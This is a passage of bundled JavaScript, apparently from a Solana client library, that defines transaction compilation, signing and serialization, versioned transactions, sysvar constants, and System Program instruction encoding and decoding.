          this.lastValidBlockHeight = void 0;
          this.nonceInfo = void 0;
          this._message = void 0;
          this._json = void 0;
          if (!opts) {
            return;
          }
          if (opts.feePayer) {
            this.feePayer = opts.feePayer;
          }
          if (opts.signatures) {
            this.signatures = opts.signatures;
          }
          if (Object.prototype.hasOwnProperty.call(opts, 'lastValidBlockHeight')) {
            const {
              blockhash,
              lastValidBlockHeight
            } = opts;
            this.recentBlockhash = blockhash;
            this.lastValidBlockHeight = lastValidBlockHeight;
          } else {
            const {
              recentBlockhash,
              nonceInfo
            } = opts;
            if (nonceInfo) {
              this.nonceInfo = nonceInfo;
            }
            this.recentBlockhash = recentBlockhash;
          }
        }
        toJSON() {
          return {
            recentBlockhash: this.recentBlockhash || null,
            feePayer: this.feePayer ? this.feePayer.toJSON() : null,
            nonceInfo: this.nonceInfo ? {
              nonce: this.nonceInfo.nonce,
              nonceInstruction: this.nonceInfo.nonceInstruction.toJSON()
            } : null,
            instructions: this.instructions.map(instruction => instruction.toJSON()),
            signers: this.signatures.map(({
              publicKey
            }) => {
              return publicKey.toJSON();
            })
          };
        }
        add(...items) {
          if (items.length === 0) {
            throw new Error('No instructions');
          }
          items.forEach(item => {
            if ('instructions' in item) {
              this.instructions = this.instructions.concat(item.instructions);
            } else if ('data' in item && 'programId' in item && 'keys' in item) {
              this.instructions.push(item);
            } else {
              this.instructions.push(new TransactionInstruction(item));
            }
          });
          return this;
        }
        compileMessage() {
          if (this._message && JSON.stringify(this.toJSON()) === JSON.stringify(this._json)) {
            return this._message;
          }
          let recentBlockhash;
          let instructions;
          if (this.nonceInfo) {
            recentBlockhash = this.nonceInfo.nonce;
            if (this.instructions[0] != this.nonceInfo.nonceInstruction) {
              instructions = [this.nonceInfo.nonceInstruction, ...this.instructions];
            } else {
              instructions = this.instructions;
            }
          } else {
            recentBlockhash = this.recentBlockhash;
            instructions = this.instructions;
          }
          if (!recentBlockhash) {
            throw new Error('Transaction recentBlockhash required');
          }
          if (instructions.length < 1) {
            console.warn('No instructions provided');
          }
          let feePayer;
          if (this.feePayer) {
            feePayer = this.feePayer;
          } else if (this.signatures.length > 0 && this.signatures[0].publicKey) {
            feePayer = this.signatures[0].publicKey;
          } else {
            throw new Error('Transaction fee payer required');
          }
          for (let i = 0; i < instructions.length; i++) {
            if (instructions[i].programId === undefined) {
              throw new Error(`Transaction instruction index ${i} has undefined program id`);
            }
          }
          const programIds = [];
          const accountMetas = [];
          instructions.forEach(instruction => {
            instruction.keys.forEach(accountMeta => {
              accountMetas.push({
                ...accountMeta
              });
            });
            const programId = instruction.programId.toString();
            if (!programIds.includes(programId)) {
              programIds.push(programId);
            }
          });
          programIds.forEach(programId => {
            accountMetas.push({
              pubkey: new PublicKey(programId),
              isSigner: false,
              isWritable: false
            });
          });
          const uniqueMetas = [];
          accountMetas.forEach(accountMeta => {
            const pubkeyString = accountMeta.pubkey.toString();
            const uniqueIndex = uniqueMetas.findIndex(x => {
              return x.pubkey.toString() === pubkeyString;
            });
            if (uniqueIndex > -1) {
              uniqueMetas[uniqueIndex].isWritable = uniqueMetas[uniqueIndex].isWritable || accountMeta.isWritable;
              uniqueMetas[uniqueIndex].isSigner = uniqueMetas[uniqueIndex].isSigner || accountMeta.isSigner;
            } else {
              uniqueMetas.push(accountMeta);
            }
          });
          uniqueMetas.sort(function (x, y) {
            if (x.isSigner !== y.isSigner) {
              return x.isSigner ? -1 : 1;
            }
            if (x.isWritable !== y.isWritable) {
              return x.isWritable ? -1 : 1;
            }
            return x.pubkey.toBase58().localeCompare(y.pubkey.toBase58());
          });
          const feePayerIndex = uniqueMetas.findIndex(x => {
            return x.pubkey.equals(feePayer);
          });
          if (feePayerIndex > -1) {
            const [payerMeta] = uniqueMetas.splice(feePayerIndex, 1);
            payerMeta.isSigner = true;
            payerMeta.isWritable = true;
            uniqueMetas.unshift(payerMeta);
          } else {
            uniqueMetas.unshift({
              pubkey: feePayer,
              isSigner: true,
              isWritable: true
            });
          }
          for (const signature of this.signatures) {
            const uniqueIndex = uniqueMetas.findIndex(x => {
              return x.pubkey.equals(signature.publicKey);
            });
            if (uniqueIndex > -1) {
              if (!uniqueMetas[uniqueIndex].isSigner) {
                uniqueMetas[uniqueIndex].isSigner = true;
                console.warn('Transaction references a signature that is unnecessary, ' + 'only the fee payer and instruction signer accounts should sign a transaction. ' + 'This behavior is deprecated and will throw an error in the next major version release.');
              }
            } else {
              throw new Error(`unknown signer: ${signature.publicKey.toString()}`);
            }
          }
          let numRequiredSignatures = 0;
          let numReadonlySignedAccounts = 0;
          let numReadonlyUnsignedAccounts = 0;
          const signedKeys = [];
          const unsignedKeys = [];
          uniqueMetas.forEach(({
            pubkey,
            isSigner,
            isWritable
          }) => {
            if (isSigner) {
              signedKeys.push(pubkey.toString());
              numRequiredSignatures += 1;
              if (!isWritable) {
                numReadonlySignedAccounts += 1;
              }
            } else {
              unsignedKeys.push(pubkey.toString());
              if (!isWritable) {
                numReadonlyUnsignedAccounts += 1;
              }
            }
          });
          const accountKeys = signedKeys.concat(unsignedKeys);
          const compiledInstructions = instructions.map(instruction => {
            const {
              data,
              programId
            } = instruction;
            return {
              programIdIndex: accountKeys.indexOf(programId.toString()),
              accounts: instruction.keys.map(meta => accountKeys.indexOf(meta.pubkey.toString())),
              data: bs58__default["default"].encode(data)
            };
          });
          compiledInstructions.forEach(instruction => {
            assert(instruction.programIdIndex >= 0);
            instruction.accounts.forEach(keyIndex => assert(keyIndex >= 0));
          });
          return new Message({
            header: {
              numRequiredSignatures,
              numReadonlySignedAccounts,
              numReadonlyUnsignedAccounts
            },
            accountKeys,
            recentBlockhash,
            instructions: compiledInstructions
          });
        }
        _compile() {
          const message = this.compileMessage();
          const signedKeys = message.accountKeys.slice(0, message.header.numRequiredSignatures);
          if (this.signatures.length === signedKeys.length) {
            const valid = this.signatures.every((pair, index) => {
              return signedKeys[index].equals(pair.publicKey);
            });
            if (valid) return message;
          }
          this.signatures = signedKeys.map(publicKey => ({
            signature: null,
            publicKey
          }));
          return message;
        }
        serializeMessage() {
          return this._compile().serialize();
        }
        async getEstimatedFee(connection) {
          return (await connection.getFeeForMessage(this.compileMessage())).value;
        }
        setSigners(...signers) {
          if (signers.length === 0) {
            throw new Error('No signers');
          }
          const seen = new Set();
          this.signatures = signers.filter(publicKey => {
            const key = publicKey.toString();
            if (seen.has(key)) {
              return false;
            } else {
              seen.add(key);
              return true;
            }
          }).map(publicKey => ({
            signature: null,
            publicKey
          }));
        }
        sign(...signers) {
          if (signers.length === 0) {
            throw new Error('No signers');
          }
          const seen = new Set();
          const uniqueSigners = [];
          for (const signer of signers) {
            const key = signer.publicKey.toString();
            if (seen.has(key)) {
              continue;
            } else {
              seen.add(key);
              uniqueSigners.push(signer);
            }
          }
          this.signatures = uniqueSigners.map(signer => ({
            signature: null,
            publicKey: signer.publicKey
          }));
          const message = this._compile();
          this._partialSign(message, ...uniqueSigners);
        }
        partialSign(...signers) {
          if (signers.length === 0) {
            throw new Error('No signers');
          }
          const seen = new Set();
          const uniqueSigners = [];
          for (const signer of signers) {
            const key = signer.publicKey.toString();
            if (seen.has(key)) {
              continue;
            } else {
              seen.add(key);
              uniqueSigners.push(signer);
            }
          }
          const message = this._compile();
          this._partialSign(message, ...uniqueSigners);
        }
        _partialSign(message, ...signers) {
          const signData = message.serialize();
          signers.forEach(signer => {
            const signature = sign(signData, signer.secretKey);
            this._addSignature(signer.publicKey, toBuffer(signature));
          });
        }
        addSignature(pubkey, signature) {
          this._compile();
          this._addSignature(pubkey, signature);
        }
        _addSignature(pubkey, signature) {
          assert(signature.length === 64);
          const index = this.signatures.findIndex(sigpair => pubkey.equals(sigpair.publicKey));
          if (index < 0) {
            throw new Error(`unknown signer: ${pubkey.toString()}`);
          }
          this.signatures[index].signature = buffer.Buffer.from(signature);
        }
        verifySignatures() {
          return this._verifySignatures(this.serializeMessage(), true);
        }
        _verifySignatures(signData, requireAllSignatures) {
          for (const {
            signature,
            publicKey
          } of this.signatures) {
            if (signature === null) {
              if (requireAllSignatures) {
                return false;
              }
            } else {
              if (!verify(signature, signData, publicKey.toBuffer())) {
                return false;
              }
            }
          }
          return true;
        }
        serialize(config) {
          const {
            requireAllSignatures,
            verifySignatures
          } = Object.assign({
            requireAllSignatures: true,
            verifySignatures: true
          }, config);
          const signData = this.serializeMessage();
          if (verifySignatures && !this._verifySignatures(signData, requireAllSignatures)) {
            throw new Error('Signature verification failed');
          }
          return this._serialize(signData);
        }
        _serialize(signData) {
          const {
            signatures
          } = this;
          const signatureCount = [];
          encodeLength(signatureCount, signatures.length);
          const transactionLength = signatureCount.length + signatures.length * 64 + signData.length;
          const wireTransaction = buffer.Buffer.alloc(transactionLength);
          assert(signatures.length < 256);
          buffer.Buffer.from(signatureCount).copy(wireTransaction, 0);
          signatures.forEach(({
            signature
          }, index) => {
            if (signature !== null) {
              assert(signature.length === 64, `signature has invalid length`);
              buffer.Buffer.from(signature).copy(wireTransaction, signatureCount.length + index * 64);
            }
          });
          signData.copy(wireTransaction, signatureCount.length + signatures.length * 64);
          assert(wireTransaction.length <= PACKET_DATA_SIZE, `Transaction too large: ${wireTransaction.length} > ${PACKET_DATA_SIZE}`);
          return wireTransaction;
        }
        get keys() {
          assert(this.instructions.length === 1);
          return this.instructions[0].keys.map(keyObj => keyObj.pubkey);
        }
        get programId() {
          assert(this.instructions.length === 1);
          return this.instructions[0].programId;
        }
        get data() {
          assert(this.instructions.length === 1);
          return this.instructions[0].data;
        }
        static from(buffer$1) {
          let byteArray = [...buffer$1];
          const signatureCount = decodeLength(byteArray);
          let signatures = [];
          for (let i = 0; i < signatureCount; i++) {
            const signature = byteArray.slice(0, SIGNATURE_LENGTH_IN_BYTES);
            byteArray = byteArray.slice(SIGNATURE_LENGTH_IN_BYTES);
            signatures.push(bs58__default["default"].encode(buffer.Buffer.from(signature)));
          }
          return Transaction.populate(Message.from(byteArray), signatures);
        }
        static populate(message, signatures = []) {
          const transaction = new Transaction();
          transaction.recentBlockhash = message.recentBlockhash;
          if (message.header.numRequiredSignatures > 0) {
            transaction.feePayer = message.accountKeys[0];
          }
          signatures.forEach((signature, index) => {
            const sigPubkeyPair = {
              signature: signature == bs58__default["default"].encode(DEFAULT_SIGNATURE) ? null : bs58__default["default"].decode(signature),
              publicKey: message.accountKeys[index]
            };
            transaction.signatures.push(sigPubkeyPair);
          });
          message.instructions.forEach(instruction => {
            const keys = instruction.accounts.map(account => {
              const pubkey = message.accountKeys[account];
              return {
                pubkey,
                isSigner: transaction.signatures.some(keyObj => keyObj.publicKey.toString() === pubkey.toString()) || message.isAccountSigner(account),
                isWritable: message.isAccountWritable(account)
              };
            });
            transaction.instructions.push(new TransactionInstruction({
              keys,
              programId: message.accountKeys[instruction.programIdIndex],
              data: bs58__default["default"].decode(instruction.data)
            }));
          });
          transaction._message = message;
          transaction._json = transaction.toJSON();
          return transaction;
        }
      }
      class TransactionMessage {
        constructor(args) {
          this.payerKey = void 0;
          this.instructions = void 0;
          this.recentBlockhash = void 0;
          this.payerKey = args.payerKey;
          this.instructions = args.instructions;
          this.recentBlockhash = args.recentBlockhash;
        }
        static decompile(message, args) {
          const {
            header,
            compiledInstructions,
            recentBlockhash
          } = message;
          const {
            numRequiredSignatures,
            numReadonlySignedAccounts,
            numReadonlyUnsignedAccounts
          } = header;
          const numWritableSignedAccounts = numRequiredSignatures - numReadonlySignedAccounts;
          assert(numWritableSignedAccounts > 0, 'Message header is invalid');
          const numWritableUnsignedAccounts = message.staticAccountKeys.length - numReadonlyUnsignedAccounts;
          assert(numWritableUnsignedAccounts >= 0, 'Message header is invalid');
          const accountKeys = message.getAccountKeys(args);
          const payerKey = accountKeys.get(0);
          if (payerKey === undefined) {
            throw new Error('Failed to decompile message because no account keys were found');
          }
          const instructions = [];
          for (const compiledIx of compiledInstructions) {
            const keys = [];
            for (const keyIndex of compiledIx.accountKeyIndexes) {
              const pubkey = accountKeys.get(keyIndex);
              if (pubkey === undefined) {
                throw new Error(`Failed to find key for account key index ${keyIndex}`);
              }
              const isSigner = keyIndex < numRequiredSignatures;
              let isWritable;
              if (isSigner) {
                isWritable = keyIndex < numWritableSignedAccounts;
              } else if (keyIndex < accountKeys.staticAccountKeys.length) {
                isWritable = keyIndex - numRequiredSignatures < numWritableUnsignedAccounts;
              } else {
                isWritable = keyIndex - accountKeys.staticAccountKeys.length < accountKeys.accountKeysFromLookups.writable.length;
              }
              keys.push({
                pubkey,
                isSigner: keyIndex < header.numRequiredSignatures,
                isWritable
              });
            }
            const programId = accountKeys.get(compiledIx.programIdIndex);
            if (programId === undefined) {
              throw new Error(`Failed to find program id for program id index ${compiledIx.programIdIndex}`);
            }
            instructions.push(new TransactionInstruction({
              programId,
              data: toBuffer(compiledIx.data),
              keys
            }));
          }
          return new TransactionMessage({
            payerKey,
            instructions,
            recentBlockhash
          });
        }
        compileToLegacyMessage() {
          return Message.compile({
            payerKey: this.payerKey,
            recentBlockhash: this.recentBlockhash,
            instructions: this.instructions
          });
        }
        compileToV0Message(addressLookupTableAccounts) {
          return MessageV0.compile({
            payerKey: this.payerKey,
            recentBlockhash: this.recentBlockhash,
            instructions: this.instructions,
            addressLookupTableAccounts
          });
        }
      }
      class VersionedTransaction {
        get version() {
          return this.message.version;
        }
        constructor(message, signatures) {
          this.signatures = void 0;
          this.message = void 0;
          if (signatures !== undefined) {
            assert(signatures.length === message.header.numRequiredSignatures, 'Expected signatures length to be equal to the number of required signatures');
            this.signatures = signatures;
          } else {
            const defaultSignatures = [];
            for (let i = 0; i < message.header.numRequiredSignatures; i++) {
              defaultSignatures.push(new Uint8Array(SIGNATURE_LENGTH_IN_BYTES));
            }
            this.signatures = defaultSignatures;
          }
          this.message = message;
        }
        serialize() {
          const serializedMessage = this.message.serialize();
          const encodedSignaturesLength = Array();
          encodeLength(encodedSignaturesLength, this.signatures.length);
          const transactionLayout = BufferLayout__namespace.struct([BufferLayout__namespace.blob(encodedSignaturesLength.length, 'encodedSignaturesLength'), BufferLayout__namespace.seq(signature(), this.signatures.length, 'signatures'), BufferLayout__namespace.blob(serializedMessage.length, 'serializedMessage')]);
          const serializedTransaction = new Uint8Array(2048);
          const serializedTransactionLength = transactionLayout.encode({
            encodedSignaturesLength: new Uint8Array(encodedSignaturesLength),
            signatures: this.signatures,
            serializedMessage
          }, serializedTransaction);
          return serializedTransaction.slice(0, serializedTransactionLength);
        }
        static deserialize(serializedTransaction) {
          let byteArray = [...serializedTransaction];
          const signatures = [];
          const signaturesLength = decodeLength(byteArray);
          for (let i = 0; i < signaturesLength; i++) {
            signatures.push(new Uint8Array(byteArray.splice(0, SIGNATURE_LENGTH_IN_BYTES)));
          }
          const message = VersionedMessage.deserialize(new Uint8Array(byteArray));
          return new VersionedTransaction(message, signatures);
        }
        sign(signers) {
          const messageData = this.message.serialize();
          const signerPubkeys = this.message.staticAccountKeys.slice(0, this.message.header.numRequiredSignatures);
          for (const signer of signers) {
            const signerIndex = signerPubkeys.findIndex(pubkey => pubkey.equals(signer.publicKey));
            assert(signerIndex >= 0, `Cannot sign with non signer key ${signer.publicKey.toBase58()}`);
            this.signatures[signerIndex] = sign(messageData, signer.secretKey);
          }
        }
        addSignature(publicKey, signature) {
          assert(signature.byteLength === 64, 'Signature must be 64 bytes long');
          const signerPubkeys = this.message.staticAccountKeys.slice(0, this.message.header.numRequiredSignatures);
          const signerIndex = signerPubkeys.findIndex(pubkey => pubkey.equals(publicKey));
          assert(signerIndex >= 0, `Can not add signature; \`${publicKey.toBase58()}\` is not required to sign this transaction`);
          this.signatures[signerIndex] = signature;
        }
      }
      const SYSVAR_CLOCK_PUBKEY = new PublicKey('SysvarC1ock11111111111111111111111111111111');
      const SYSVAR_EPOCH_SCHEDULE_PUBKEY = new PublicKey('SysvarEpochSchedu1e111111111111111111111111');
      const SYSVAR_INSTRUCTIONS_PUBKEY = new PublicKey('Sysvar1nstructions1111111111111111111111111');
      const SYSVAR_RECENT_BLOCKHASHES_PUBKEY = new PublicKey('SysvarRecentB1ockHashes11111111111111111111');
      const SYSVAR_RENT_PUBKEY = new PublicKey('SysvarRent111111111111111111111111111111111');
      const SYSVAR_REWARDS_PUBKEY = new PublicKey('SysvarRewards111111111111111111111111111111');
      const SYSVAR_SLOT_HASHES_PUBKEY = new PublicKey('SysvarS1otHashes111111111111111111111111111');
      const SYSVAR_SLOT_HISTORY_PUBKEY = new PublicKey('SysvarS1otHistory11111111111111111111111111');
      const SYSVAR_STAKE_HISTORY_PUBKEY = new PublicKey('SysvarStakeHistory1111111111111111111111111');
      async function sendAndConfirmTransaction(connection, transaction, signers, options) {
        const sendOptions = options && {
          skipPreflight: options.skipPreflight,
          preflightCommitment: options.preflightCommitment || options.commitment,
          maxRetries: options.maxRetries,
          minContextSlot: options.minContextSlot
        };
        const signature = await connection.sendTransaction(transaction, signers, sendOptions);
        const status = transaction.recentBlockhash != null && transaction.lastValidBlockHeight != null ? (await connection.confirmTransaction({
          signature: signature,
          blockhash: transaction.recentBlockhash,
          lastValidBlockHeight: transaction.lastValidBlockHeight
        }, options && options.commitment)).value : (await connection.confirmTransaction(signature, options && options.commitment)).value;
        if (status.err) {
          throw new Error(`Transaction ${signature} failed (${JSON.stringify(status)})`);
        }
        return signature;
      }
      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }
      function encodeData(type, fields) {
        const allocLength = type.layout.span >= 0 ? type.layout.span : getAlloc(type, fields);
        const data = buffer.Buffer.alloc(allocLength);
        const layoutFields = Object.assign({
          instruction: type.index
        }, fields);
        type.layout.encode(layoutFields, data);
        return data;
      }
      function decodeData$1(type, buffer) {
        let data;
        try {
          data = type.layout.decode(buffer);
        } catch (err) {
          throw new Error('invalid instruction; ' + err);
        }
        if (data.instruction !== type.index) {
          throw new Error(`invalid instruction; instruction index mismatch ${data.instruction} != ${type.index}`);
        }
        return data;
      }
      const FeeCalculatorLayout = BufferLayout__namespace.nu64('lamportsPerSignature');
      const NonceAccountLayout = BufferLayout__namespace.struct([BufferLayout__namespace.u32('version'), BufferLayout__namespace.u32('state'), publicKey('authorizedPubkey'), publicKey('nonce'), BufferLayout__namespace.struct([FeeCalculatorLayout], 'feeCalculator')]);
      const NONCE_ACCOUNT_LENGTH = NonceAccountLayout.span;
      class NonceAccount {
        constructor(args) {
          this.authorizedPubkey = void 0;
          this.nonce = void 0;
          this.feeCalculator = void 0;
          this.authorizedPubkey = args.authorizedPubkey;
          this.nonce = args.nonce;
          this.feeCalculator = args.feeCalculator;
        }
        static fromAccountData(buffer) {
          const nonceAccount = NonceAccountLayout.decode(toBuffer(buffer), 0);
          return new NonceAccount({
            authorizedPubkey: new PublicKey(nonceAccount.authorizedPubkey),
            nonce: new PublicKey(nonceAccount.nonce).toString(),
            feeCalculator: nonceAccount.feeCalculator
          });
        }
      }
      const encodeDecode = layout => {
        const decode = layout.decode.bind(layout);
        const encode = layout.encode.bind(layout);
        return {
          decode,
          encode
        };
      };
      const bigInt = length => property => {
        const layout = BufferLayout.blob(length, property);
        const {
          encode,
          decode
        } = encodeDecode(layout);
        const bigIntLayout = layout;
        bigIntLayout.decode = (buffer$1, offset) => {
          const src = decode(buffer$1, offset);
          return bigintBuffer.toBigIntLE(buffer.Buffer.from(src));
        };
        bigIntLayout.encode = (bigInt, buffer, offset) => {
          const src = bigintBuffer.toBufferLE(bigInt, length);
          return encode(src, buffer, offset);
        };
        return bigIntLayout;
      };
      const u64 = bigInt(8);
      class SystemInstruction {
        constructor() {}
        static decodeInstructionType(instruction) {
          this.checkProgramId(instruction.programId);
          const instructionTypeLayout = BufferLayout__namespace.u32('instruction');
          const typeIndex = instructionTypeLayout.decode(instruction.data);
          let type;
          for (const [ixType, layout] of Object.entries(SYSTEM_INSTRUCTION_LAYOUTS)) {
            if (layout.index == typeIndex) {
              type = ixType;
              break;
            }
          }
          if (!type) {
            throw new Error('Instruction type incorrect; not a SystemInstruction');
          }
          return type;
        }
        static decodeCreateAccount(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 2);
          const {
            lamports,
            space,
            programId
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.Create, instruction.data);
          return {
            fromPubkey: instruction.keys[0].pubkey,
            newAccountPubkey: instruction.keys[1].pubkey,
            lamports,
            space,
            programId: new PublicKey(programId)
          };
        }
        static decodeTransfer(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 2);
          const {
            lamports
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.Transfer, instruction.data);
          return {
            fromPubkey: instruction.keys[0].pubkey,
            toPubkey: instruction.keys[1].pubkey,
            lamports
          };
        }
        static decodeTransferWithSeed(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          const {
            lamports,
            seed,
            programId
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.TransferWithSeed, instruction.data);
          return {
            fromPubkey: instruction.keys[0].pubkey,
            basePubkey: instruction.keys[1].pubkey,
            toPubkey: instruction.keys[2].pubkey,
            lamports,
            seed,
            programId: new PublicKey(programId)
          };
        }
        static decodeAllocate(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 1);
          const {
            space
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.Allocate, instruction.data);
          return {
            accountPubkey: instruction.keys[0].pubkey,
            space
          };
        }
        static decodeAllocateWithSeed(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 1);
          const {
            base,
            seed,
            space,
            programId
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.AllocateWithSeed, instruction.data);
          return {
            accountPubkey: instruction.keys[0].pubkey,
            basePubkey: new PublicKey(base),
            seed,
            space,
            programId: new PublicKey(programId)
          };
        }
        static decodeAssign(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 1);
          const {
            programId
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.Assign, instruction.data);
          return {
            accountPubkey: instruction.keys[0].pubkey,
            programId: new PublicKey(programId)
          };
        }
        static decodeAssignWithSeed(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 1);
          const {
            base,
            seed,
            programId
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.AssignWithSeed, instruction.data);
          return {
            accountPubkey: instruction.keys[0].pubkey,
            basePubkey: new PublicKey(base),
            seed,
            programId: new PublicKey(programId)
          };
        }
        static decodeCreateWithSeed(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 2);
          const {
            base,
            seed,
            lamports,
            space,
            programId
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.CreateWithSeed, instruction.data);
          return {
            fromPubkey: instruction.keys[0].pubkey,
            newAccountPubkey: instruction.keys[1].pubkey,
            basePubkey: new PublicKey(base),
            seed,
            lamports,
            space,
            programId: new PublicKey(programId)
          };
        }
        static decodeNonceInitialize(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          const {
            authorized
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.InitializeNonceAccount, instruction.data);
          return {
            noncePubkey: instruction.keys[0].pubkey,
            authorizedPubkey: new PublicKey(authorized)
          };
        }
        static decodeNonceAdvance(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.AdvanceNonceAccount, instruction.data);
          return {
            noncePubkey: instruction.keys[0].pubkey,
            authorizedPubkey: instruction.keys[2].pubkey
          };
        }
        static decodeNonceWithdraw(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 5);
          const {
            lamports
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.WithdrawNonceAccount, instruction.data);
          return {
            noncePubkey: instruction.keys[0].pubkey,
            toPubkey: instruction.keys[1].pubkey,
            authorizedPubkey: instruction.keys[4].pubkey,
            lamports
          };
        }
        static decodeNonceAuthorize(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 2);
          const {
            authorized
          } = decodeData$1(SYSTEM_INSTRUCTION_LAYOUTS.AuthorizeNonceAccount, instruction.data);
          return {
            noncePubkey: instruction.keys[0].pubkey,
            authorizedPubkey: instruction.keys[1].pubkey,
            newAuthorizedPubkey: new PublicKey(authorized)
          };
        }
        static checkProgramId(programId) {
          if (!programId.equals(SystemProgram.programId)) {
            throw new Error('invalid instruction; programId is not SystemProgram');
          }
        }
        static checkKeyLength(keys, expectedLength) {
          if (keys.length < expectedLength) {
            throw new Error(`invalid instruction; found ${keys.length} keys, expected at least ${expectedLength}`);
          }
        }
      }
      const SYSTEM_INSTRUCTION_LAYOUTS = Object.freeze({
        Create: {
          index: 0,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), BufferLayout__namespace.ns64('lamports'), BufferLayout__namespace.ns64('space'), publicKey('programId')])
        },
        Assign: {
          index: 1,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), publicKey('programId')])
        },
        Transfer: {
          index: 2,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), u64('lamports')])
        },
        CreateWithSeed: {
          index: 3,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), publicKey('base'), rustString('seed'), BufferLayout__namespace.ns64('lamports'), BufferLayout__namespace.ns64('space'), publicKey('programId')])
        },
        AdvanceNonceAccount: {
          index: 4,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction')])
        },
        WithdrawNonceAccount: {
          index: 5,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), BufferLayout__namespace.ns64('lamports')])
        },
        InitializeNonceAccount: {
          index: 6,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), publicKey('authorized')])
        },
        AuthorizeNonceAccount: {
          index: 7,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), publicKey('authorized')])
        },
        Allocate: {
          index: 8,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), BufferLayout__namespace.ns64('space')])
        },
        AllocateWithSeed: {
          index: 9,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), publicKey('base'), rustString('seed'), BufferLayout__namespace.ns64('space'), publicKey('programId')])
        },
        AssignWithSeed: {
          index: 10,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), publicKey('base'), rustString('seed'), publicKey('programId')])
        },
        TransferWithSeed: {
          index: 11,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), u64('lamports'), rustString('seed'), publicKey('programId')])
        },
        UpgradeNonceAccount: {
          index: 12,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction')])
        }
      });
      class SystemProgram {
        constructor() {}
        static createAccount(params) {
          const type = SYSTEM_INSTRUCTION_LAYOUTS.Create;
          const data = encodeData(type, {
            lamports: params.lamports,
            space: params.space,
            programId: toBuffer(params.programId.toBuffer())
          });
          return new TransactionInstruction({
            keys: [{
              pubkey: params.fromPubkey,
              isSigner: true,
              isWritable: true
            }, {
              pubkey: params.newAccountPubkey,
              isSigner: true,
              isWritable: true
            }],
            programId: this.programId,
            data
          });
        }
        static transfer(params) {
          let data;
          let keys;
          if ('basePubkey' in params) {
            const type = SYSTEM_INSTRUCTION_LAYOUTS.TransferWithSeed;
            data = encodeData(type, {
              lamports: BigInt(params.lamports),
              seed: params.seed,
              programId: toBuffer(params.programId.toBuffer())
            });
            keys = [{
              pubkey: params.fromPubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: params.basePubkey,
              isSigner: true,
              isWritable: false
            }, {
              pubkey: params.toPubkey,
              isSigner: false,
              isWritable: true
            }];
          } else {
            const type = SYSTEM_INSTRUCTION_LAYOUTS.Transfer;
            data = encodeData(type, {
              lamports: BigInt(params.lamports)
            });
            keys = [{
              pubkey: params.fromPubkey,
              isSigner: true,
              isWritable: true
            }, {
              pubkey: params.toPubkey,
              isSigner: false,
              isWritable: true
            }];
          }
          return new TransactionInstruction({
            keys,
            programId: this.programId,
            data
          });
        }
        static assign(params) {
          let data;
          let keys;
          if ('basePubkey' in params) {
            const type = SYSTEM_INSTRUCTION_LAYOUTS.AssignWithSeed;
            data = encodeData(type, {
              base: toBuffer(params.basePubkey.toBuffer()),
              seed: params.seed,
              programId: toBuffer(params.programId.toBuffer())
            });
            keys = [{
              pubkey: params.accountPubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: params.basePubkey,
              isSigner: true,
              isWritable: false
            }];
          } else {
            const type = SYSTEM_INSTRUCTION_LAYOUTS.Assign;
            data = encodeData(type, {
              programId: toBuffer(params.programId.toBuffer())
            });
            keys = [{
              pubkey: params.accountPubkey,
              isSigner: true,
              isWritable: true
            }];
          }
          return new TransactionInstruction({
            keys,
            programId: this.programId,
            data
          });
        }
        static createAccountWithSeed(params) {
          const type = SYSTEM_INSTRUCTION_LAYOUTS.CreateWithSeed;
          const data = encodeData(type, {
            base: toBuffer(params.basePubkey.toBuffer()),
            seed: params.seed,
            lamports: params.lamports,
            space: params.space,
            programId: toBuffer(params.programId.toBuffer())
          });
          let keys = [{
            pubkey: params.fromPubkey,
            isSigner: true,
            isWritable: true
          }, {
            pubkey: params.newAccountPubkey,
            isSigner: false,
            isWritable: true
          }];
          if (params.basePubkey != params.fromPubkey) {
            keys.push({
              pubkey: params.basePubkey,
              isSigner: true,
              isWritable: false
            });
